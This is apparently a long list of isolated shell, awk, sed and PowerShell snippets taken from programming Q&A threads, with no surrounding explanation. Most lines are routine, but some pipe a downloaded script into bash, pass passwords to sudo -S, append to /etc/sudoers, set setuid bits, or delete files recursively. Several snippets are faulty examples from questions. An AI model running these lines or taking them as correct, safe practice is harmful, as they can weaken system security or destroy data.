cd "my path"
cd "$(echo $input_path)"
cd my
man join
grep -o
LSFJOB_647169535/ LSFJOB_647158534/
LSFJOB_647169535/ LSFJOB_647158534/
bind -v|grep color
pgrep <<pid name>>
git diff --stat origin/master
git diff --stat origin/master
ps -f
ps -f
ps -f
44, 1406, 66643, 6664, .....
exec ("bin/sh", ~something, something);
ssh user@hostname "/etc/init.d/mysql start < /dev/null > /tmp/log 2>&1 &"
sed -i -e "s/ENV\['SERVER_URL'\]/my.domain.com/g" setup.rb
grep abc_source|source2_201501.csv
"cal 2014"
some_function "cal" "2014"
t "echo foo"
t echo foo
t echo "foo bar"
awk -FS
awk -f
$ awk -FS'-' '{print $1,$2} data.txt
'{print $1,$2}'
java -cp ../lib/*:../zookeeper-3.4.6.jar:. WordCount
[06/Feb/2014:00:00:38 +0000]
Package gawk-3.1.7-10.10.amzn1.x86_64 already installed and latest version
CDPATH= 
> /dev/null
readlink -f
readlink -e
readlink -f
dir=$(dirname "$(readlink -f -- "$0")")
readlink -e
[[ $0 != "$BASH_SOURCE" ]]
command -v -- "$0"
command -v -- "$0"
command -v -- "$0"
command -v -- "$0"
command -v -- "$0"
command -v -- "$0"
command -v
sh myScript
command -v -- "$0"
[ "$0" = "sh" ] || [ "$0" = "-sh" ] || [ "$0" = "/bin/sh" ]
command -v -- "$0"
sh ~/bin/myScript
myScript   # executes /home/jdoe/bin/myScript, for instance
sh myScript
sh ./myScript
sh -c 'echo \$0: $0 \$1: $1' foo one  # -> '$0: foo $1: one'
sh < myScript
ls ... ?
git checkout -b new_branch
chmod +x craftbukkit.sh
crontab -e
readlink -f $0
find "$directory"
-mtime +2
man find
-type f
-exec gzip {} \;
"3 days ago"
man bash
eb create
Errno 13
sudo chown -R test /home/test
ERROR: OSError :: [Errno 2] No such file or directory: './.collab/ext'
eb create
eb create
eb init
eb create
RET_FLAG = 0
(return code) = 0
set +e
set +e
pgrep mysqld | wc -l
service mysql status
PermitRootLogin no
PermitRootLogin no
grep ""^"ab"c"""" filename
grep hello file
grep "hello" file
grep "-i hello" file
grep -i hello file
grep -i "hello" file
<command> | grep '^Name\|^Estimated'
awk -F"=" '/^Name|^Estimated/ {print $2}'
awk -F"=" '/^Name|^Estimated/ {print $2}'| sed 'N;s/\n/ /'
declare -p
declare -i
declare -A
echo $line
ssh -X
28 April 1966
awk -F '\t' -f foo.awk filename.csv
bash -c history
./script.py > script.log
alias foo="my command with\"quotes\""
alias unlock="grep screen /var/log/auth.log|grep \"\$(date|awk '{print \$2\" \"\$3}')\""
chmod +x $HOME/bin/unlocks
date|awk '{print $2" "$3}'
return 0
false | customizedLog
true | customizedLog
script.sh | customizedLog
ps -T --forest
( command ; echo $? ) | piped_command_that_is_aware_of_such_an_arrangement
test code
test code
log_user 1
save cursor position
restore cursor position
clear to end of line
apt-get install sl
pip install SoftLayer
alias sl='/usr/games/sl'
find ... -exec ./script '{}' l1 l2 \;
sed -i.bak ...
[ -z $1 -o -z $2 -o $3 ]
for a in {1..10}; do echo "this is line $a"; done >> test.txt
sed ':a;6,8{6h;6!H;d;ba};9{p;x};' test.txt | sed '7{h;d};9{p;x}'
6h; 6!H
A=3 && B=7 && sed ':a;'${A}','$((${B}-1))'{'${A}'h;'${A}'!H;d;ba};'${B}'{p;x};' test.txt | sed $(($A+1))'{h;d};'${B}'{p;x}'
{ $1 = $1 }
Test 2>/tmp/error.log
awk -F: '($1==U){print $5}' U=$LOGNAME /etc/passwd
Diogo Saraiva,,,
Diogo Saraiva
awk -F: -v U="$LOGNAME" '$1==U{print $5}' /etc/passwd
Diogo Saraiva,,,
echo "$BASH_VERSION"
failed to connect to server: No such file or directory
bash test.sh <some_valid_host> 20:00
abc def ghi
composer install
composer install
grep -nHi "Account_Id" *
find -exec
awk printf
find * -mtime -30
find program* -mtime -30
assert something.makeAssertion
find … -exec
set -x
kill %1
sub(/ .*/, "", $NF)
> file.mp3
mv file.txt file.mp3
shell -c ". xxx"
Process.run('. somescript.sh, runInShell: true);
sed -r 's/([^$][0-9][0-9][.]00). ????' file.html
sprintf("\$%.2f", $1 + 3)
END{for(i in c)print i, c[i]-1}
wc -l
ls -a
envSetCmd = {"sh", "-c", "export LD_LIBRARY_PATH="+excBinFilepath+":$LD_LIBRARY_PATH"}.
echo $LD_LIBRARY_PATH
cut --complement
set -o pipefail
local exit_status=${1:-$?}
DATE_TIME=$(date +"%Y-%m-%d_%T")
%d.%m.%Y, %T
DATE_TIME_2=$(date -d $DATE_TIME +"%d.%m.%Y, %T")
while read variable1 variable2 variable3
while true
Track number
Codec ID
| + A track
| +
Track number
Codec ID
| grep -Eo [0-9]+ | head -1
Codec ID
| + A track
%windir%\system32\cmd.exe /T:24 c:\path\to\msysgit\sh.exe
color /?
sh.exe --help
find: missing argument to '-exec'
du -h --max-depth=0 * | sort -r
if [ $x -ge 1.0 ] ; do
gzip -k S .bak filename
cp filename.bak /some/where/else/
gzip -k -S .bak filename
insertImages.sh "/path/to/the/template.fodp" "/path/to/the/document" "image1.png" "image2.png" "image3.png"
-d delim
< delta.txt
cat delta.txt |
< data.$SGE_TASK_ID
> results.$SGE_TASK_ID
echo ${line:start:end}
-e 's/^[^]]*][^A-Za-z]*//'
-e 's/\bon\b.*$//'
-e 's/\s*$//'
$(printf "%s" {a..z})
echo ... | command
command <<< ...
for l in
sh -c
[ x"$1" != x"" ]
set -e
[ -n "$1" ] || exit_failure_syntax
$# -ne 0
x"$var" = x""
command_a && command_b
python -m ...
command_a; command_b
command_a || true; command_b
curl -gu username:passwd: command not found
sort a.txt > a.txt
command input > output && mv output input
sort a.txt | sponge a.txt
echo 1st parameter: $p1 2nd parameter: $2 3rd parameter: $p3
scriptname test -gm git@remote.com
scriptname test -gm git@remote.com -ig
scriptname test -ig
$ executeToVar SOME_VAR ls -l *  #
ls -l *
- echo -e -n '\n\n123\n456\n789\n\n'
STDIN stream
$( cat ${1} )
$( cat ${1:--} )
-bash: exax${i*40}.txt: bad substitution
which ifup
$ sudo visudo
sed -i
cat tmp.txt
> tmp.txt
sed -i
sed -i
if(!$ARGV[0]) {$help = 1;}
/usr/local/bin/32bitSafePerl: line 69: : command not found
"$interpreter" "/tmp/32bitSafePerl/${command}" "$@"
cat -n
man nl
$1 in a {print a[$1],$2;}
man bash
file foo
shopt -s nullglob
shopt -u nullglob
grep -F
cat something |
Choice /?
set /?
for /f
set /p
for /F
!delayed expansion!
$files = get-childitem -file someDir\
? { -not $_.PSIsContainer }
% { $i=0 } { ++$i; "$i) $_" }
{ $i=0 }
{ ++$i; "$i) $_" }
"$i) $_"
"$i) $($_.fullname)"
$reply = read-host -p "Enter the number of the file you want to select"
"You picked $($files[$reply-1]) ($reply)"
ls -trl
find . -mtime +1 -exec rm {} \;
Use this script as "tzfrs update/new [projectName]"
if { $pid1 -eq $pid2 ];
if [[ $pid1 == $pid2 ]]; then
foo {{VAR1}} bar {{VAR2}} baz
{{VAR1}} bar {{VAR2}}
sed -e '{s/{{\([^{]*\)}}/${\1}/g;}' filename
sed -e '{s/{{\([^{]*\)}}/${\1}/g; s/^/echo "/; s/$/";/}' filename
s/^/echo "/
echo "
-g -debug
make -j 4 all
flock 200
flock -s 200
ps -O cmd
flock 200
flock 200
flock -u 200
rm ...
MAC OS X 10.8.5
idle time
/usr/libexec/PlistBuddy -c "Set :idleTime 120" \/Users/MyUser/Library/Preferences/ByHost/com.apple.screensaver."System_MAC_Address".plist
defaults write /Users/MyUser/Library/Preferences/com.apple.screensaver.plist askForPassword -int 1
System Preferences -> Desktop and Screensaver
id == 324523
echo | bc |
pandoc: !*: openFile: does not exist (No such file or directory)
pandoc -s -f markdown -t man README.md | groff -T utf8 -man | less
cross-device link
readlink /proc/self/fd/0
readlink /dev/fd/0
[ -f /dev/fd/0 ]
set -e
set -e
test -r
set -e
foo || true
set -e
<pstree command> | grep -P -o 'processTarget\([0-9]+\)'
man grep
<pstree command> | grep -P -o 'processTarget\([0-9]+\)' | grep -P -o '[0-9]+'
$5 in a
condition { statement }
print $0
commandoline parameter
sort -r
Pussycat Dolls
US Top 40
RSS Feed ID
US Top 100/27 Apr 15/1…
(CountryCode, StateCode).
Song.  That is the fact that you will count on in the
ORDER BY,
Each Artist is independent
Each Song is independent
Each Artist recorded 1-to-n Songs (via ArtistSong)
Each Song was recorded by 1-to-n Artists (via ArtistSong)
Artists can have many RecordedSongs
Each RecordedSong can only have 1 Artist
Each RecordedSong can only have 1 Song
Ave Maria
Karen Carpenter, Celine Dion, and Yours Truly
Karen Carpenter-Ave Maria, Celine Dion-Ave Maria, and Yours Truly-Ave Maria
[ -e $DIR/$FILE ]
[ -e /.test_files/First word and more ]
wscript.exe ./myVisualBasicScript.vbs
$( ...)
which psql
which psql
brew install postgresql
which psql
export PATH=$PATH:/Applications/Postgres.app/Contents/Versions/9.4/bin
brew uninstall postgresql
which psql
IAM Instance Role
S3 Server Side Encryption
IAM Instance Role
User Data
Launch Configuration
IAM Role
IAM Role
docker run
Launch Config
grep -F
wc -l
grep -c
wc -l
grep -v
grep -oP
; do
{ .. }
git rebase <something><TAB>
3 10 3 40 2 10 5 50
s/Thing to sub/subsitution/optional extra command
sh -c "..."
sh -c "..."
sh -c "..."
composer install
set -e
set -x
su root
echo "PASSWORD" | sudo -S su - && sudo su
\r\"gu1.txt\" 16L, 87C
"samX ALL=(ALL:ALL) ALL"
bash runme.sh
chmod u+s
wc file
wc -l < file.txt
$(( ))
id -Gn
id -gn
[[ ]]
set -e
bash -c
bash -c
(...) && false
set -e
bash -c
set -e
for iF in $inputFiles
for iF in ~/project/tests/input/*
alias "alias1 || alias2"="command"
grep -R protal ./ | sed 's/:.*//g' | sed 's/\/\//\//g'
grep -q protal file.txt
sed -i "s/$input_string/$replace_value/"
GNU Parallel
-j 8
sed -r
read am
$(seq "$am")
date.timezone = Europe/London
;date.timezone =
awk -v
pstree -p <other arguments>
ping google.com
64 bytes from 74.125.130.101:
run_model {} && sem --id transfer transfer_model {}
parallel -j2
up bac<Tab>
up <Tab>
[[ ]]
[ ]
man bash
|| echo ...
-abc value
tail -n 1 * | grep -L "#"
(standard input)
echo <line> >> /etc/sudoers
sed -i -e '$a<line>' /etc/sudoers
text to add
10 digits long
grep -r "FOO" file.txt
grep --after-context=1
TRACE(FOO, CAT, INFO, "HELLO WORLD"
set -e
date +%s
SELECT FROM_UNIXTIME(<YOUR TIMESTAMP>, <YOUR MYSQL DATE FORMAT>)
<YOUR TIMESTAMP>
grep -v "H1" input.gro > output.gro
foo -> test.php
bar -> test.php
cd /usr/bin
ln -s apt-get apt-get1
function apt-get () {
USER=$(who am i | awk '{print $1}' )
logger  $USER " apt-get "
apt-get1 "$@"
echo $label
man awk
-d " "
-f N
[$PROCESSES_RUNNING -eq 0]
if [ condition ]
if [condition]
"dmidecode --type memory"
$ converToPNG img.jpg
"convert $1 output.png"
crontab -e
cd mydirectory
mkdir .folder
ls -a
sed 's/^/Thou art a /' myfile
cd $HOME;
list directory entries instead of contents,
ls --help
$ ssh $SERVERNAME < script.sh
cat command.text | awk '{print "ssh user@remotehost "$0" "}' | sh -x
ssh user@remotehost
"GET /kiosk/kioskconf.txt HTTP/1.1"
sort | uniq
{"any line content"}
[ echo "$2" != | grep -iq "^hibagon" ]
if __name__ == '__main__'
if __name__ == '__main__'
"0 "
set -e
return 2> /dev/null
$0 ~ first
RequestTTY yes
mount -o loop,offset=0x01 file.vdi mountpoint
.anyfile_and anywhere_that_set_it_and_declare_it
grep -r
$ grep -r PATH .
"export PATH "
pkill -0
[ ]
Maven home directory
find . -type f -not -name xxx
if [[ ]]
[ -f ]
[ word ]
[ -n word ]
printf -v
awk '{print substr($0,0,length($0)-1)}' new.csv
awk -F',' '$4!=""'
awk -F',' '{print NR, "->", $6!=""}'
tac file
awk '/endcue/,/startcue/'
sed 's/\xBF//g'
Version AJM 93t+ 2010-06-21
type -p
command -v
"while IFS= read -r -d $'\0' line; do"
-v M=2
print $2,M,$1
print $2,M,$3
FOO="hello %s"; printf "$FOO bar \n" baz;
mkdir some_path
mkdir some_path
typeset -i i
gpg --list-keys [key-id]
gpg --list-keys [key-id]  >/dev/null 2>&1 || ...
gpg --keyserver hkp://keyserver.ubuntu.com -k [your-key-id]
cat file.txt | cmd
Downloading (file):%
read variable
-v quiet
s/\n/ /
./ccc.sh demo.m demo
./ccc.sh demo.m demo
"foo bar baz"
find … -exec bash -c 'yourscript' _ {} +
exec 3<&1
read varname
< /dev/null
man bash
tput cols
cat foo.txt | wc -l
less foo.txt
less --LINE-NUMBERS foo.txt
cat foo.txt | wc -l
eval $( resize )
sed -i
sed -i
sed -i
find . -name metadata.txt -exec grep -l --null filename1 {} +
xargs -0 sed -i "/^filename1 /{s/'= 1\.0\.0'/'= 2.0.0'/;}"
sed -i
/^filename1 /
s/'= 1\.0\.0'/'= 2.0.0'/
exec ... +
"s/\(filename1[[:space:]]\{1,\}'= \)1\.0\.0/\12.0.0/"
'= 1.0.0
-exec ... +
root -l run.cxx
$ brew install gnu-sed
-maxdepth 4
-type d
brew install gnu-sed
export CLOUDSDK_CORE_DISABLE_PROMPTS=1; curl -s https://sdk.cloud.google.com | bash &>/tmp/gcloud_install_$(date +%Y%m%d%H%M).log
grep -v
awk '($0 == 0) && (NR % 2 == 0) { next } { print }' cpu_values.txt
IP=$(wget -qO- ipinfo.io/ip)
wget -O - http://www.stackoverflow.com/ | html2text | grep "How.*\?"
w3m http://www.stackoverflow.com/ | grep "How.*\?"
./script workdir
printf %s "${myFD}"
alias '{FD}'="$( getFd )"
{FD} <filename
shopt -s expand_aliases
MyCommand MyVariable < <( command1 | command2 ; ) ;
$ command1 | command2 | MyCommand MyVariable ;
tail -n +N file | grep
find . -perm -o-r
-type f
sudo -u www-data find . ! -readable \( -type f -print -o -prune \)
find . -perm 700
find . -perm 600
find . -perm -o-r
-perm -o=r
printf %q
printf %q
for i in *.fa; base=$(basename $i _*.fa); comb="${base}_ec.txt"; mv ec.txt $comb; done
echo "$i"|sed 's/_.*//'
for i in *.fasta; some program here & done
pip install
unset _OLD_VIRTUAL_PATH
curl -u 'USER' https://api.github.com/user/repos -d '{"name":"xxx"}'
git config
sed 's/\r$//'
new String[] {"bash", "-c", "source activate abc_env"}
"cd /wherever/your/files/are; source activate cvxpy_env"
chmod +x
192<any char>1
192<any char>
192<any char>1
192<any char>11
192<any char>111
192<any char>1<any char>
192<any char>1
$(basename "$file" .txt)
man basename
man -P 'less -p "^   Param"' bash
ps aux
node task.js
node worker.js
node task.js
node worker.js
pkill -f "node worker.js"
jobs -p
sh parser.sh
mkdircd new_directory
git --bare init
git init
git init --bare
git init --bare myproject.git
echo -n
mysqldump ..
( … )
wait $(jobs -p)
jobs -p
exit 1
wait -n 1
date '+%m.…'
while read $failai
while read failai
"Run command ${foo}?"
php composer.phar install
composer config -g github-oauth.github.com <oauthtoken>
machine api.mydomain.com
sed -e '/machine api.mydomain.com/,+2d' ~/.netrc
machine api.mydomain.com
declare -a arr=($(< $KEY))
"3 3"
"4 4"
"3 3"
"4 4"
sort -k
machine api.mydomain.com
username boo
netrc-fetch MACHINE [FIELD]
netrc-fetch api.mydomain.com user
grep -A2
cap staging deploy
rvm use $rubyver --default
rvm list
[ \t]
[ \t]
[ \t]
svn log
echo $SHELL
ionic run ios
ionic run
rev | cut | rev
sed -r -e 's/[^.]+\.[^.]+.//'
man bc
grep --only-matching
rm -rf .history.txt
cat > .whatever.txt
jq -r .test[].Web
.type == "3"
awk "\$1==$chr{print \$1}"
awk '$1=="Chr1"{print $1}'
awk '$1=="$chr"{print $1}'
awk "$1=='$chr'{print $1}"
[[ ]]
$ ./getBackup
GNU bash, version 4.3.11(1)-release (x86_64-pc-linux-gnu)
wc -w
wc -c
wc -m
grep expresion file
cat file | grep expresion
"[ a-z[\]]\+"
"[][a-z ]\+"
Write failed: Broken pipe
bash -x
-e "Action"
tail -f file | nc irc.server.org | while read string
/NAMES #channel
NICKSERV STATUS Username
sed 's/\(;[0-9]\+\)\.\([0-9]\{4\}\)/\1,\2/g'
$(ls *.properties)
set +m ; shopt -s lastpipe
exec("echo \"passwd\" | sudo -S ./myscript");
oclint not found, analyzing stopped
[[ ... ]]
sed ':a;N;$!ba;s/ \\\x0D\x0A\x09/ /g' filename
'"$(printf '\r')"'\n
-e ':a' -e '$!{N;ba' -e '}'
s/ \\\n[[:blank:]]*/ /g
substr($0, 1, length($0)-1)
printf "%s"
{ print }
sub(/^[[:blank:]]+/, "")
sub(/[[:blank:]]*\\$/, "")
printf "%s "
{ print }
man printf
sleep 0.01
systemctl status
systemctl is-active
source ~/.bashrc
\\[\\e]0; \\u@\\h: \\w\\a\\]
perl -p -i -e
echo $Dir
crontab -e
sub("\n\\begin{enumerate*}", "\\begin{enumerate*}", fixed = TRUE)
perl -p
> test.txt
>${FIFOfile} &
[1] <PID_NO>
alias streamTo=' | true ; LAST_EXEC="!!" ; myNewCommandVariation <<<'
$ cmd1 | cmd2 | myNewCommandVariation THE_VAR_NAME_TO_SET
command -v program_name
if 0;
$ program "command1 command2 ... commandN"
$ program command1 command2 ... commandN
program $(echo "command1 command2 ... commandN")
echo "var/opt/test/war/test-webapp-4.1.56.war" | sed -nre 's/^[^0-9]*(([0-9]+\.)*[0-9]+).*/\1/p'
ps -lp {processID}
nice -n
ps -lp
No such file or directory
git checkout .
git status --porcelain
git status -z
substr($0, 1, length($0)-1)
printf "%s"
{ print }
getline t
make install
<<EOF ...
s//& $a/
sed -i
awk -i inplace
perl -i
sed -i
tail -f
sudo /path/to/test.sh
Defaults:www-data !requiretty
sudo -t ...
export SUDO_ASKPASS=/usr/lib/openssh/gnome-ssh-askpass
www-data ALL=/etc/path-to-my/script.sh
grep "^.{4,}$"
print STDERR
read command
read -e command
history -s "$command"
read command
help read
help history
!NF {f=1;next}
(( ))
[[ ... ]]
uname -r
uname -r
cat /etc/os-release
cat /etc/lsb-release
cat /etc/fedora-release
lsb_release -a
cat /proc/version
uname -a
read -d
read -r
set -vx
-maxdepth 1
ps -a | tr -s ' ' ' ' | cut -d' ' -f5 | sed '1d'
ps -a | tr -s ' ' ' ' | cut -d' ' -f5 | sed '1d'
/bin/bash -c 'some | pipe | line'
echo "${PIPESTATUS[@]}"
./my_script.sh 4 Hello to thise nice girls
MY_CMD='export AWKNUMF="%.2f"; exe 93 "$1" "$2" "$3" $(shift 3; echo "$@") | sort -k1,1 | exe 93 ":" 1 2'
./perl_script.pl my_command_name [param1 [param2 ... [paramN]]]
system ($my_cmd, "@ARGV");
use strict
script A
script B
script A
exit xxx
exit 1
set -e
set -e
set -e
set -o pipefail
set -e
cmd ||
set -e
(false) || false
exit 1
echo $PATH
ls -l
input="rdesktop -x m -r disk:USBDISK=/media -r disk:user=/home/user/ -r printer:HP_Officejet_Pro_8600 -a 16 -u -p -d -g 80% 192.168.0.5"
rdesktop -x m -r disk:USBDISK=/media -r disk:user=/home/user/ -r printer:"HP_Officejet_Pro_8600 MS Publisher Imagesetter" -a 16 -u -p -d -g 80% 192.168.0.5
vim -d
does not exists
size > 0
man test
man read
[ -f "$file" ] && [ -s "$file" ]
error 500
git clone https://my.domain.com/repo.git
git clone http://my.domain.com/repo.git
git clone http://my.domain.com/repo.git
git clone
git pull
git push
unpack failed
chown -R git:git repo.git
chown -R git:nginx repo.git
"$1" "$2"
print '%q '
one "two three" *
perl -pe 's:\r^{: {\r:g'
perl -pe 's:^{:foobar:g'
perl -pe 's:\r:foobar:g'
s/\n{/ {\n/g;
sh foo.sh
xcode-select -p
ls dir/**/*.js
find dir -name '*.js'
shopt -s globstar
application -R "@$readgroup"
eval "application -R '$readgroup'"
char *argv[]
/variableStep/{close(f); f="file" ++c;next}
tar -xzf proftpd-1.3.3e.tar.gz
cd proftpd-1.3.3e
./configure –sysconfdir=/etc
make install
ln -s /usr/local/sbin/proftpd /usr/sbin/proftpd
groupadd ftpgroup
useradd -G ftpgroup onedomain -s /sbin/nologin -d /home/onedomain/public_html/
vim /etc/proftpd.conf
vim /etc/init.d/proftpd
/etc/init.d/proftpd start
|| exit
checkIt "php5-fpm"
checkIt "php5"
sh file_name
file_name: 9: Illegal option -a filename: 10: filename: Bad substitution
/bin/bash ./file_name
bash file_name
/etc/rc.d/rc.local file.
"hello world" | /usr/bin/pbcopy
echo "hello world"
sudo -i /usr/local/bin/my_script.sh
sudo /bin/bash -c "source ./config.sh; ./real_script.sh"
git diff --cached --name-status
$( ... )
(( ... ))
/tmp/150507 test.log
/tmp/150507 test.log
printf -v
man printf
man 3 printf
man 3 printf
man 1 printf
info coreutils printf
man bash
info bash printf
help printf
type <command>
{ ... }
abc&uniqabc123abc123abc123 123456789
' &uniq.\{1,21\})'
perl -lne 'print "<a href=\"$_\">"' file
perl -pe 's/(.*)/<a href="$1">/' file"
-v var=val
-L 1
-I {}
/bin/bash -c '<what to execute>'
wget --no-check-certificate --progress=bar URL
wg URL
tail -f
tail -f
man inotify
auditctl -w /path/to/that/file -p wa
-F"[ ,]+"
-i inplace
find /tmp/foo /tmp/bar -print -quit
Error Log
grep 'file not found' /var/log/httpd/error_log
inotifywait -e close_write fileName
--timeout / -t
function join2 { local IFS="$1"; shift; echo "$*"; };ix="0"; ixx="5"; count="0"; count2=$(ps faux | egrep -w 'usr/bin/php|/opt/php*/bin/'|awk '{print $1, $3, $4,$14, $15}' | wc -l);
initialARRAY=($(ps faux | egrep -w 'usr/bin/php|/opt/php*/bin/'|awk '{print $1, $3, $4,$14, $15}'));
while [[ $count -lt $count2 ]]; do memARRAY+=("$(join2 ' ' ${initialARRAY[@]:$ix:$ixx})"); count=$(( $count + 1 )); ix=$(( $ix + 5 )); done
| sh
awk -F/ '{print $5 "-" $4}'
chmod 0755 myscript
bash --version
bash --version
#!/usr/bin/env bash
sleep 1
kill $(jobs -p)
kill $BKGRD_CMD_PID
ls -v ./file*
m     = uniform(0, 0, 1)
m     = uniform(0, 0, 1)
No such file or directory error
go to
sed 's/go to //g'
tr -d '</>'
sed -E 's/CITY|COUNTRY|STATE|ZIP|STREETNUM|STREET//g'
xargs -i echo "go to <ADDRESS>{}</ADDRESS>"
mvn package
cat <<EOF > file [code]EOF
cat EOF
vagrant ssh-config
vagrant ssh-config
netstat /a /n
DISPLAY=:0.0 startmyapp
{s/.*[0-9]\+): //;H}
00:31:54.184 MNK  I 4155809232 (monklog:391):
/\^M/  {g;s/\n//g;s/\^M.*//p;};
man wget
(( ))
export DATESTRING
unzip -ls
NR>1 && substr($0,1,length(last))!=last {print last;}
END{print last}
/bin/cat /etc/redhat-release
/bin/cat /etc/redhat-release
/bin/cat /etc/redhat-release
echo $devcluster2
echo text | command
xsel -o
a string
"a string"
bash -c 'command' argv0 argv1 argv2..
-exec bash -c 'command' _ {} +
/bin/bash ./command.sh
/bin/sh ./command.sh
cd <dirname>
j <dirname>
C:/Program Files (x86)/Git/bin/bash
C:/Program Files (x86)/Git/bin/bash
while read
lspkg /absolute/path/to/file
A, B, a
ratio=+2 completed=+5d
rtcontrol path=$PATHS -qopath
uniq, sed and awk
rtcontrol name="*Test* -qoname|uniq -u
/ 2e=1; 54.334689
scale=1; 54.334689 / 2
command: ndk-build
jslint somefile
java -jar /usr/local/lib/jslint4java-2.0.5.jar
-type f
-maxdepth 1
df -k
{print $6}
{print $5+0" "$6}
"test This info i need grep</singleline>"
grep --help
failai=$(find -x $katalogas)
awk -F '[ \t]*' '...' file1 file2
source ~/.rvm/scripts/rvm
export PATH="$PATH:$HOME/.rvm/bin" # Add RVM to PATH for scripting
source ~/.rvm/scripts/rvm
line 59
-c count
-w timeout
-t timeout
-c 2
64 bytes from x.x.x.x: icmp_seq=1 ttl=63 time=137 ms
stdbuf -o0
saveFile 1 2 3
sh saveFile.sh 1 2 3
./runner test
command arguments > output 2>&1
command $1
some string
git push
which ant
echo *([!min]).css
date +'%s,%Y-%m-%d,%H:%M:%S:,%a'
date -d @1234567890 +'%s,%Y-%m-%d,%H:%M:%S:,%a
./tree.sh 3
bash test.sh
cat -v
sudo apt-get install dos2unix
brew install dos2unix
sed $'s/\r$//' win.txt > unix.txt
awk 'sub("\r$", "")+1' win.txt > unix.txt
for loop
while read
echo f<tab>
echo foo
ls fo<tab>
ls foo
echo h<Tab>
echo hello
ls -a
['.  ..  FILE1  FILE2\n']
mkdir my-new-project
cd $_
mkdir some_dir && cd $_
|| & && ; ;; ( ) | |& <newline>
user/[user ID]/sites/[site ID]/
user/[user ID]/editor/index.html
user/[user ID]/editor/index.html
echo foo
if [[ $f == "Loader"]] && CLEANED_ASSETS == false; then
[[ ... ]]
[[ $f == "Loader"]]
[[ $f == "Loader" ]]
[[ -d "Assets"]]
[[ -d "Assets" ]]
CLEANED_ASSETS = true
CLEANED_ASSETS == false
[[ $CLEANED_ASSETS == false ]]
cd Assets/
cd ../../
rm -rf Assets/vendor Assets/composer.lock
rm -rf "$f/vendor" "$f/composer.lock"
subl .
code .
Atom Shell
.bash profile
/Applications/Visual\ Studio\ Code.app
Install 'Code' command in path
View | Command Palette
$( )
hr=$(issuehour "$hour")
docker build -t ubuntu1404/djangoapp .
_trap [sig1] [sig2] ...
mongo domains --eval
Command grouping
Process Substitution
Here Document
./sbt dependency-tree
grep org.slf4j:jul-to-slf4j:1.7.7
./sbt dependency-tree | grep org.slf4j:jul-to-slf4j:1.7.7
kill -9
Quick Build
View PDF
print resolved symbolic links or canonical file names
tail -f
screen -x
screen -ls
screen -x <id>
_,stdout,_=ssh.exec_command("[ -f d:/tryssh/1.txt ] && echo OK")
make: *** No rule to make target
pulls'.  Stop.
GNU make
curl resource
echo $(curl resource)
printf '%s\n'
node -e
$(wildcard …)
make -j5
source $REPLY/myScript.sh
sh $REPLY/myScript.sh
/path/to/file/ is a directory
raspistill -o cam.jpg
LIRC daemon
! echo
['myscript.py', '--name=Some Text With Spaces']
['myscript.py', '--name="Some', 'Text', 'With', 'Spaces"']
./myscript.sh $(ls)
find . -type f -print0 |xargs -0 grep "test"
./myscript.sh $(ls)
find . -type f -maxdepth 1
-exec ./myscript.sh {} +
find ... -exec ... +
git fetch --quiet
define('HOST', \$_SERVER['HTTP_HOST']);
qsub job_script dummy  UVM ACC ...
rbenv install -l
rbenv install VERSION
rbenv install x.x.x
rbenv install
brew reinstall --HEAD ruby-build
brew unlink ruby-build
brew install --HEAD ruby-build
brew upgrade
rbenv install <required latest version>
VAR=value command
VAR=value; command
export VAR=value
VAR=value; export VAR
set -a
TSAN_OPTIONS="suppressions=/somewhere/file" ./myprogram
export varName[=value]
declare -x varName[=value]
export -p
unset [-v] MYVAR
export -n MYVAR
declare -p MYVAR
declare -x
for S in $(cat file2 | awk '{print $1}'); do grep $S file1; done
1 2 3 4 5
set -o igncr
Compound Commands
man bash
ps -ef
/tmp/example.bash &
sleep 1000
man test
$ a
echo $PATH | tr -s ':' '\n'
pattern_type glob
exec /usr/bin/zsh
exec zsh
exec 2>&1 1>output.txt
echo "$(timeout 10 echo -e 'a\nb' | wc -l)"
echo "$(timeout 2 echo "$(eval $a)")"
s/\n\([^0-9]\)/ \1/gp
crontab -l
man printf
wc -l < file
SC2129: Consider using { cmd1; cmd2; } >> file instead of individual redirects.
./test 34 455
until mountpoint ...
while mountpoint ...
md5sum "$file"
script -c 'mycommand'
[ "$STR1" == "$STR2" ]
-i inplace
tr < hex.txt
awk $([[ $(gawk --version 2>/dev/null) = GNU* ]] && printf %s -n) -v RS=' ' '{ printf "%c", int(sprintf("%d", "0x" $0)) }' < hex.txt
xargs printf '0x%s ' < hex.txt
getconf ARG_MAX
awk -v RS=' ' '{ printf "%c", $0 }'
awk -v RS=' '
printf "%c", $0
$ date "+%v %H:%M:%S" | xxd -b
$ date | xxd -b
log_list /tmp/abc*
awk -f script.awk file
-n 1
grep -o
cat test.sh | awk '{print $1}'
sub($1"$", "")
sub($1"$", "")
echo -e
which php
export PATH=/Applications/AMPPS/php-5.4/bin/php:$PATH
which php
echo $PATH
a-process | another-process
yes | interactive-script
yes | long-interactive-script
(for i in $(seq 12); do echo 'yes'; done) | long-interactive-script
cat /proc/sys/fs/pipe-max-size
fcntl(fd, F_SETPIPE_SZ, size)
$( ... )
| grep
| grep
some_command $G some_text
some_command | grep some_text
DIRECTORY=$(dirs -l)\:/home/docker/
/* "*/" hello i'm still comment
You must define ANDROID_NDK, ANDROID_SDK before starting. .....
echo $ANDROID_SDK
echo $ANDROID_NDK
/root/files/tetst\ test\ tgdjd/1\ 5765765\ 565765\
perl -pe "s|(some).*(text)|\11\2|"
amirla@ubuntu:~/Desktop/os/class/ex4$       1       1       6
Ubuntu 14.04
read -u7 a
7< <(echo "$A")
A=$(seq 10 15); B=$(seq 20 25);
paste <(echo "$A") <(echo "$B")
-v varName=varValue
getline line <
2015/05/12.mp4: No such file or directory
sudo -s
>> system log
sudo -s <<<"dmidecode -t $i" >> system.log
sudo -s
awk '{ print $1 }' file1
awk '{ print $1 }' file1
Sep 08 04:53:30
sleep 10000 &
ps -aef | grep 5984
python processtree.py
parent = psutil.Process(pid).parent()
read -r
Unicode clients require a unicode enabled server.
p4 users
file -bi
def commit(self, details, files, branch, parent = "")
git p4
man top
mkdir foo; cd foo; tar xzf ~/bar.tgz
overwrite ./.? (y/n [n])
find $1
mv: bar and ./bar are identical
sed 's/^[A-Z]\{15\}//' file > new_file
sed -i 's/^[A-Z]\{15\}//' file
-i ''
sed -i '' 's/^[A-Z]\{15\}//' file
sed -i.bak 's/^[A-Z]\{15\}//' file
sed '0~2s/^.\{15\}//g' filename
${parameter:offset:length }
which ruby
ruby -v
which ruby
ruby -v
sudo apt-get install ruby1.9.3
let $CLEANED_ASSETS=true
set -u
while read
-u 3
3< server.txt
read _ server _ <&3
read -u
read _ server _
